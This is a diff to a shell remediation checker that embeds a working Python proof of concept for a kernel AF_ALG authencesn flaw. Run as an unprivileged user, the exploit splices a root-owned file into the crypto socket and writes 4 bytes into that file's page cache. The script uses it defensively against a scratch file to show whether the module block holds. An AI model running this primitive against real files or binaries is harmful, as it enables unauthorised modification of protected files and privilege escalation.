@@ -173,10 +173,13 @@ fi
 # persistent block produces.
 #
 # Three independent properties are required, each graded separately:
-#   residency — algif_aead must not be loaded right now
-#   closure   — an AF_ALG AEAD bind must be refused, i.e. autoload is blocked
-#   targeting — unrelated modules must still autoload, so the control is a
-#               module-specific block and not a blanket kill of all autoloading
+#   residency      — algif_aead must not be loaded right now
+#   exploitability — the CVE's own primitive must no longer be performable. Not
+#                    "is a bind refused": the 4-byte page-cache write is actually
+#                    attempted, so an open surface is proven exploitable rather
+#                    than merely reachable.
+#   targeting      — unrelated modules must still autoload, so the control is a
+#                    module-specific block and not a blanket kill of autoloading
 CTRL_OK=1
 
 module_resident() { grep -qE "^$1 " /proc/modules 2>/dev/null; }
@@ -220,14 +223,111 @@ else
     echo "PASS [PoC/residency]: algif_aead is not resident in the host kernel."
 fi
 
-# 2. Closure. A refused bind proves the host declines to autoload the module.
-#    When the control is correct this probe cannot load anything, so it cannot
-#    undo the fix it is grading. When the control is absent the bind does
-#    autoload the module, so the pre-probe residency state is restored below —
-#    otherwise a FAIL would leave the host dirtier than the probe found it and
-#    poison the next run. rmmod, not modprobe -r: this image has no
-#    /lib/modules for the host kernel, so modprobe cannot resolve the name.
-AEAD_RESULT=$(alg_probe aead "gcm(aes)")
+# 2. Exploitability — a POSITIVE CONTROL, not a reachability proxy.
+#
+# A refused bind only shows the module will not autoload. It cannot tell "the
+# AEAD surface is unreachable" from "the surface is open but the flaw does not
+# work here", so on its own it never demonstrates the CVE and a scenario built on
+# it grades an assumption. This runs the actual primitive instead.
+#
+# Chain, per crypto/algif_aead.c and crypto/authencesn.c on this kernel:
+# splice() hands af_alg_sendpage() the file's own page-cache pages by reference,
+# needing only read access; _aead_recvmsg()'s in-place path (commit 72548b093ee3)
+# passes one scatterlist as both source and destination and chains the leftover
+# pages onto it; crypto_authenc_esn_decrypt_tail() then writes 4 bytes at
+# assoclen+cryptlen, one step past the declared output region, landing in a
+# page-cache page. The write is confirmed by comparing file content, so a PASS
+# cannot come from the exploit merely erroring out.
+#
+# Run as uid 65534 against a root-owned 0644 scratch file: the property being
+# demonstrated is a write with NO write permission, which a root caller could not
+# distinguish from an ordinary one. The scratch file is unlinked afterwards, so
+# the corrupted page cache belongs to nothing. The advisory notes page-cache
+# damage does not survive a reboot, and nothing here touches a real binary.
+exploit_probe() {
+    _t=/tmp/.srb-aead-target
+    rm -f "$_t"
+    # The content pattern is load-bearing, not arbitrary. authencesn re-reads
+    # bytes 4..8 of its own destination and writes them back at
+    # assoclen+cryptlen; the in-place path has already copied the file's AAD into
+    # that region, so the value written is the FILE's bytes 4..8. A uniformly
+    # filled file therefore has 'AAAA' written over 'AAAA' and the corruption is
+    # invisible even though it happened. Bytes 0..16 must differ from the byte at
+    # the overflow offset for the write to be observable at all.
+    { dd if=/dev/zero bs=16 count=1 2>/dev/null | tr '\0' 'A'
+      dd if=/dev/zero bs=1024 count=8 2>/dev/null | tr '\0' 'B'
+    } > "$_t" || { echo noprobe; return; }
+    chown root:root "$_t" 2>/dev/null
+    chmod 0644 "$_t" 2>/dev/null
+    _r=$(setpriv --reuid=65534 --regid=65534 --clear-groups \
+           python3 - "$_t" 2>/dev/null <<'PYEOF'
+import os, socket, struct, sys
+SOL_ALG=279; SET_KEY=1; SET_IV=2; SET_OP=3; SET_ASSOCLEN=4; SET_AUTHSIZE=5
+DECRYPT=0; ASSOC=16; AUTH=16; TOTAL=4096; IVLEN=16
+path=sys.argv[1]
+try:
+    s=socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
+except PermissionError:
+    print("noperm"); raise SystemExit(0)
+except OSError:
+    print("nofamily"); raise SystemExit(0)
+try:
+    s.bind(("aead","authencesn(hmac(sha256),cbc(aes))"))
+except OSError:
+    # Separate "template missing" from "no AEAD surface at all": if a plain AEAD
+    # still binds, autoload is not blocked and the host is not remediated.
+    try:
+        t=socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
+        t.bind(("aead","gcm(aes)")); t.close(); print("notemplate")
+    except OSError:
+        print("blocked")
+    raise SystemExit(0)
+# rtattr(CRYPTO_AUTHENC_KEYA_PARAM) + be32 enckeylen + authkey + enckey.
+key=struct.pack("=HH",8,1)+struct.pack(">I",16)+b"K"*32+b"E"*16
+try:
+    s.setsockopt(SOL_ALG,SET_KEY,key)
+    s.setsockopt(SOL_ALG,SET_AUTHSIZE,None,AUTH)
+    op,_=s.accept()
+except OSError:
+    print("reachable"); raise SystemExit(0)
+op.settimeout(15)
+before=open(path,"rb").read()
+cryptlen=TOTAL-ASSOC-AUTH
+fd=os.open(path,os.O_RDONLY); r,w=os.pipe()
+try:
+    op.sendmsg([],[(SOL_ALG,SET_OP,struct.pack("=I",DECRYPT)),
+                   (SOL_ALG,SET_IV,struct.pack("=I",IVLEN)+b"\0"*IVLEN),
+                   (SOL_ALG,SET_ASSOCLEN,struct.pack("=I",ASSOC))], socket.MSG_MORE)
+    pushed=0
+    while pushed<TOTAL:
+        n=os.splice(fd,w,TOTAL-pushed)
+        if not n: break
+        pushed+=os.splice(r,op.fileno(),n,flags=(4 if pushed+n<TOTAL else 0))
+    try:
+        op.recv_into(memoryview(bytearray(ASSOC+cryptlen)),ASSOC+cryptlen)
+    except OSError:
+        pass          # EBADMSG is expected; the overflow lands on the way there
+except OSError:
+    pass
+finally:
+    os.close(fd); os.close(r); os.close(w); op.close(); s.close()
+after=open(path,"rb").read()
+d=[i for i,(a,b) in enumerate(zip(before,after)) if a!=b]
+# Require the change to be exactly where the flaw puts it. Any other diff is not
+# this CVE and must not be reported as a successful exploitation.
+if d and d[0]==ASSOC+cryptlen:
+    print("exploited:%d:%d"%(d[0],len(d)))
+elif d:
+    print("changed:%d:%d"%(d[0],len(d)))
+else:
+    print("reachable")
+PYEOF
+) || _r=noprobe
+    rm -f "$_t"
+    [ -n "$_r" ] && echo "$_r" || echo noprobe
+}
+
+AEAD_RESULT=$(exploit_probe)
 case "$AEAD_RESULT" in
     noperm)
         echo "SKIP [PoC]: socket(AF_ALG) returned EPERM, so this sandbox is not running" \
@@ -236,24 +336,38 @@ case "$AEAD_RESULT" in
         exit 42
         ;;
     blocked)
-        echo "PASS [PoC/closure]: AF_ALG AEAD bind refused — the host declines to autoload algif_aead."
+        echo "PASS [PoC/exploitability]: AF_ALG AEAD bind refused — the host declines to" \
+             "autoload algif_aead, so the CVE-2026-31431 primitive cannot be reached."
         ;;
     nofamily)
         # The AEAD surface is shut, but by removing af_alg wholesale rather than
         # algif_aead specifically. The targeting check below reports it.
-        echo "WARN [PoC/closure]: socket(AF_ALG) returned EAFNOSUPPORT — the af_alg core" \
-             "will not load, so the AEAD surface is closed but so is all userspace crypto."
+        echo "WARN [PoC/exploitability]: socket(AF_ALG) returned EAFNOSUPPORT — the af_alg" \
+             "core will not load, so the AEAD surface is closed but so is all userspace crypto."
         ;;
-    accessible)
-        echo "FAIL [PoC/closure]: AF_ALG AEAD bind succeeded — the host still autoloads" \
-             "algif_aead, so the attack surface is open. Block the module in the HOST's" \
+    exploited:*)
+        echo "FAIL [PoC/exploitability]: the CVE-2026-31431 primitive still works — an" \
+             "unprivileged uid wrote $(echo "$AEAD_RESULT" | cut -d: -f3) byte(s) at offset" \
+             "$(echo "$AEAD_RESULT" | cut -d: -f2) into the page cache of a root-owned 0644" \
+             "file it had no write permission for. Block algif_aead in the HOST's" \
              "module-load policy, not this container's." >&2
         module_resident algif_aead && rmmod algif_aead 2>/dev/null
         CTRL_OK=0
         ;;
+    reachable|notemplate|changed:*)
+        # The surface is open — a bind succeeded — but the write did not land.
+        # Reported as a failure, never as safety: an unremediated host must not
+        # pass just because this verifier could not complete the exploit.
+        echo "FAIL [PoC/exploitability]: the host still autoloads the AF_ALG AEAD surface" \
+             "($AEAD_RESULT), so the attack surface is open. The 4-byte page-cache write did" \
+             "not land in this attempt, which does not make the host safe — the module must" \
+             "still be blocked in the HOST's module-load policy." >&2
+        module_resident algif_aead && rmmod algif_aead 2>/dev/null
+        CTRL_OK=0
+        ;;
     *)
-        echo "FAIL [PoC/closure]: AF_ALG probe could not run, so the attack surface" \
-             "could not be shown closed." >&2
+        echo "FAIL [PoC/exploitability]: the exploit probe could not run ($AEAD_RESULT), so" \
+             "the attack surface could not be shown closed." >&2
         CTRL_OK=0
         ;;
 esac
